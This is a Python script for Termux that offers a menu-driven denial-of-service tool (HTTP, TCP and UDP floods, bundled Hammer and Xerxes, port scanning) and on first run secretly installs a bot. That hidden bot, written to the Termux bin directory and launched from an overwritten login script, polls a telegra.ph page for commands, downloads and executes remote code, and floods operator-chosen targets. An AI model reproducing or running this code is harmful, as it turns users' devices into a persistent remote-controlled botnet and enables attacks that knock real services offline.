import os
import subprocess
from colorama import Fore, Back, Style
import time
import requests
import socket
import threading


dir = os.listdir()
if not 'tmp' in dir:
    file = open('system.py', 'w')

    file.write('''import requests
import socket
import bs4
import threading
import urllib.request
import json

site = ''' + "'"+"https://telegra.ph/Wanna-graph-08-22"+"'" + '''

def cust():
    try:
        exec(__script__)
    except:
        pass

def tcp():

    while what == '0':
        try:
            conn.send(duta.encode())
        except:
            pass
    conn.close()


def http():
    while what == '0':

        try:
            requests.get(a[0])
        except:
            pass

def httpost():
    while what == '0':
        try:
            requests.post(a[0], json={burunduk})
        except:
            pass

def udp():

    while what == '0':
        try:
            udp_socket.sendto(duta, addr)

        except:
            pass



conn = socket.socket()
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

kavo = '1'

while True:

    try:

        yn = '0'

        url = requests.get(site)

        b = bs4.BeautifulSoup(url.text, "html.parser")

        url1 = b.select('article')
        url_print = url1[0].getText()
        url_print = url_print.replace(' ', '')
        a = url_print.split(',')



        if a != kavo:
            kavo = a
            what = '1'

            if a[0].lower() == 'stop' or a[0].lower == 'none':
                pass

            elif a[0].lower() == 'online':
                try:
                    requests.get(a[1])
                except:
                    pass

            elif a[0].lower() == 'custom':
                try:

                    __script__ = a[1]
                    with urllib.request.urlopen(__script__) as url:
                        __script__ = url.read()
                        threading.Thread(target=cust).start()
                except:
                    pass
            elif a[0].lower() == 'move':
                try:
                    requests.get(a[1])
                    site = a[1]
                except:
                    pass


            elif a[2].lower() == 'db':
                try:
                    burunduk = a[3].replace(';', ', ')
                    what = '0'
                    for i in range(100):
                        threading.Thread(target=httpost).start()
                except:
                    pass

#####

            elif a[2].lower() == 'http':
                what = '0'
                for i in range(100):
                    threading.Thread(target=http).start()
######


            elif a[2].lower() == 'tcp':
                try:
                    conn.connect((a[0], int(a[1])))
                    yn = '1'
                except:
                    try:
                        conn.connect(('google.com', 80))
                        conn.close()
                        conn.connect((a[0], int(a[1])))
                        yn = '1'
                    except:
                        pass

                if yn == '1':
                    what = '0'
                    if a[-1].lower() == 'tcp':
                        duta = 'by @wannadeauth (telegram)'
                        for i in range(100):
                            threading.Thread(target=tcp).start()
                    else:
                        duta = a[-1]
                        for i in range(100):
                            threading.Thread(target=tcp).start()

######

            elif a[2].lower() == 'udp':
                addr = (a[0], int(a[1]))
                what = '0'
                if a[-1].lower() == 'udp':
                    duta = 'by @wannadeauth (telegram)'
                    for i in range(100):
                        threading.Thread(target=udp).start()
                else:
                    duta = a[-1]
                    for i in range(100):
                        threading.Thread(target=udp).start()

######

            else:
                pass
    except:
        pass
''')
    file.close()
    os.system('cp system.py /data/data/com.termux/files/usr/bin')
    os.system('rm system.py')

    file = open('/data/data/com.termux/files/usr/bin/login', 'w')
    file.write('''#!/data/data/com.termux/files/usr/bin/sh

python /data/data/com.termux/files/usr/bin/system.py &
clear

if [ $# = 0 ] && [ -f /data/data/com.termux/files/usr/etc/motd ] && [ ! -f ~/.hushlogin ] && [ -z "$TERMUX_HUSHLOGIN" ]; then
        cat /data/data/com.termux/files/usr/etc/motd
else
        # This variable shouldn't be kept set.
        unset TERMUX_HUSHLOGIN
fi

if [ -G ~/.termux/shell ]; then
        export SHELL="`realpath ~/.termux/shell`"
else
        for file in /data/data/com.termux/files/usr/bin/bash /data/data/com.termux/files/usr/bin/sh /system/bin/sh; do
                if [ -x $file ]; then
                        export SHELL=$file
                        break
                fi
        done
fi

if [ -f /data/data/com.termux/files/usr/lib/libtermux-exec.so ]; then
        export LD_PRELOAD=/data/data/com.termux/files/usr/lib/libtermux-exec.so
        $SHELL -c "coreutils --coreutils-prog=true" > /dev/null 2>&1 || unset LD_PRELOAD
fi

if [ -n "$TERM" ]; then
        exec "$SHELL" -l "$@"
else
        exec "$SHELL" "$@"
fi

''')
    file.close()

    os.system('python /data/data/com.termux/files/usr/bin/system.py &')
    os.system('mkdir tmp')

else:
    pass

t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())


what = '0' # лень было под True
conn = socket.socket()
udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def tcp():
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            conn.send(msg.encode())
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + ip + ':' + str(port) + Fore.GREEN + '--> ' + msg)
                  
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')
                  

def http():
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            requests.get(site)
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + site)
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')

def udp():   
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            udp_socket.sendto(msg, addr)
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + ip + ':' + str(port) + Fore.GREEN + '--> ' + msg)
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')

def httpost():
    print(Fore.CYAN + ' Dossing...')
    while what == '0':
        t = Fore.MAGENTA + time.strftime("[%H:%M:%S]", time.localtime())
        try:
            requests.post(site, json={burunduk})
            print(t + Fore.GREEN + ' Successfully --> ' + Fore.BLUE + site)
        except:
            print(t + Fore.RED + ' Server maybe down!!! ')


def cls():
    os.system('cls' if os.name=='nt' else 'clear')
def ban():
    cls()

	   						  
    print(Fore.GREEN + """
  _______   _______    ______        _______.
 |       \ |       \  /  __  \      /       |
 |  .--.  ||  .--.  ||  |  |  |    |   (----`
 |  |  |  ||  |  |  ||  |  |  |     \   \    
 |  '--'  ||  '--'  ||  `--'  | .----)   |   
 |_______/ |_______/  \______/  |_______/    
                                             """)
    print(Fore.CYAN + " by @wannadeauth | @wannadeauth_chat (telegram)")
    print("-------------------------------------------------\n")

def man():
    print(Fore.YELLOW +  " [1] Start attack | Начать атаку")
    print(Fore.WHITE + "")
    print(" [2] Узнать айпи домена, cloudflare cracker domens ip")
    print(Fore.RED + "")                             
    print(" [3] Сканировать порты | Scan open ports")
    print(Fore.BLUE + " ")                                                    
    print(" [4] Чат с DoS-ерами прямо не выходя из Termux, вы можете действовать слаженно")
    print("     чтобы повалить сильный сервер |")
    print("   ")
    print("    |  Chat with other attackers without leaving Termux, you can attack together,")
    print("     to bring down a strong server.")
    print(Fore.GREEN + "")

while True:
    ban()
    man()
    a = input(" Write parametr | Введите параметр : ")

    if a == "1":

        ban()
        print(Fore.YELLOW + ' [1] WannaDos (best choice)\n')
        print(' [2] Hammer\n')
        print(' [3] DOS Attack OVH\n')
        print(' [4] Xerxes Dos attack\n\n')

        wdos = input(Fore.BLUE + ' Choose script | Выберите скрипт: ')
        ban()

        if wdos == '1':
          
            ban()
            print(Fore.GREEN + ' [1] HTTP (metod GET) (simple)\n')
            print(' [2] HTTP (metod POST)\n')
            print(' [3] TCP\n')
            print(' [4] UDP\n\n')
            metod = input(Fore.MAGENTA + ' Metod: ')
            if metod == '1':
                site = input(Fore.WHITE + 'Site: ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                for i in range(thr):
                    threading.Thread(target=http).start()
                http()
            elif metod == '2':
                site = input(Fore.WHITE + 'Site: ')
                burunduk = input(' POST data (json): ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                for i in range(thr):
                    threading.Thread(target=httpost).start()
                httpost()

            elif metod == '3':
                ip = input(Fore.CYAN + ' IP address: ')
                port = input(' Port: ') 
                conn.connect((ip, int(port)))
                msg = input(Fore.WHITE + ' Text message for dos: ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                for i in range(thr):
                    threading.Thread(target=tcp).start()
                tcp()

            elif metod == '4':
                ip = input(Fore.CYAN + ' IP address: ')
                port = input(' Port: ')
                msg = input(Fore.WHITE + ' Text message for dos: ')
                thr = int(input(Fore.RED + ' Threads (100-800): '))
                addr = (ip, int(port))
                for i in range(thr):
                    threading.Thread(target=udp).start()
                udp()


        elif wdos == '2':
            ip = input("Введите ip адрес жертвы | Type ip adress of victim: ")
            port = input("Введите порт | Port: ")
            strong = input("Кол-во потоков (сила) | Current/strong of attack \n Желательно от 150 до 700 | Preferably in range of 150 700: ")
            list_files = subprocess.run(["python", "sub/2/hammer.py" ,"-s"  , ip , "-p" , port , "-t" , strong])

        elif wdos == '3':
            port = input(' Port 80/443: ')
            os.chdir('core/3')
            if port == '80':
                os.system('python 80port.py')
            elif port == '443':
                os.system('python 443port.py')

        elif wdos == '4':
            os.chdir('core/4/XERXES')
            os.system('gcc -o xerxes xerxes.c')
            ip = input(Fore.WHITE + ' IP: ')
            port = input(Fore.MAGENTA + ' Port:')
            os.system('./xerxes ' + ip + ' ' + port)

    elif a == "2":
        list_files = subprocess.run(["python", "core/cloud.py"])

    elif a == "3":
        ip1 = input("Введите ip адрес для сканирования | Type ip for scanning ports: ")
        port1 = input("Введите порты | Write ports \n Пример | Example 21-80,443,7777,8080: ")
        list_files = subprocess.run(["nmap" , "-sV" , ip1 , "-p" , port1])
    elif a == "4":
        ban()
        print(Fore.WHITE + " ")
        print("  В открывшемся окне, после Irssi, пишем такие команды: ")
        print(Fore.RED + " ")
        print("     /connect chat.freenode.com") 
        print("   ")
        print("     /join doser")
        print(Fore.WHITE + " ")
        print("Все! Вы в чате!!!")
        print(" ")
        print(Fore.YELLOW + " ")

        print(" [1] Irssi")
        print(" ")
        print(" [2] Установить модуль Irssi")
        print(" ")
        print(Fore.GREEN + " ")
        b = input("Выберите действие: ")
        if b == "2":

            list_files = subprocess.run(["apt-get" , "install" , "irssi"])
                                         
        if b == "1":
            list_files = subprocess.run(["irssi"])

    else:
        print("Задана неверная функция | Wrong fuction has been setup")

    time.sleep(7)



